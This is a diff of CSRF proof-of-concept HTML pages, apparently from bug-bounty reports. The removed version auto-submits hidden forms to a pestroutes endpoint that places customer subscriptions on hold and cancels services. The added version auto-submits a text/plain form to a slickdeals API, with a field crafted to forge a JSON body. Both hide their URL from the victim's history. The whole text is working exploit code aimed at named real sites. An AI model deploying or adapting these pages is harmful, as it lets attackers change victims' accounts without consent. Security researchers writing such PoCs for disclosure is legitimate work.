@@ -1,42 +1,12 @@
-<html>  
-<body>  
-<script>  
-const subscriptions = [18784, 14275];
-
-const actionUrl = "https://stagingdev.pestroutes.com/resources/delegates/customerDelegate.php";  
-const delayMs = 1000; // 1 second between requests
-
-subscriptions.forEach((id, i) => {  
-setTimeout(() => {  
-const form = document.createElement("form");  
-form.action = actionUrl;  
-form.method = "POST";
-
-const addHidden = (name, value) => {  
-const inp = document.createElement("input");  
-inp.type = "hidden";  
-inp.name = name;  
-inp.value = value;  
-form.appendChild(inp);  
-};
-
-// fields from the original PoC  
-addHidden("action", "placeSubscriptionOnHold");  
-addHidden("holdReason", "");  
-addHidden("subscriptionID", String(id));  
-addHidden("holdNotes", "test");  
-addHidden("cancelPendingServices", "1");
-
-document.body.appendChild(form);  
-form.submit();
-
-// cleanup: remove the form after a short delay  
-setTimeout(() => { if (form.parentNode) form.parentNode.removeChild(form); }, 5000);  
-}, i * delayMs);  
-});
-
-// hide PoC URL from the victim's history  
-history.pushState('', '', '/');  
-</script>  
-</body>  
-</html>
+<html>
+  <body>
+    <form action="https://slickdeals.net/web-api/mutation/reportExpiredDeal/" method="POST" enctype="text/plain">
+      <input type="hidden" name="&#123;&quot;dealId&quot;&#58;&quot;thread&#45;18695035&quot;&#44;&#13;&#10;&quot;csrf&quot;&#58;&quot;&#59;" value="&quot;&#125;" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html> 
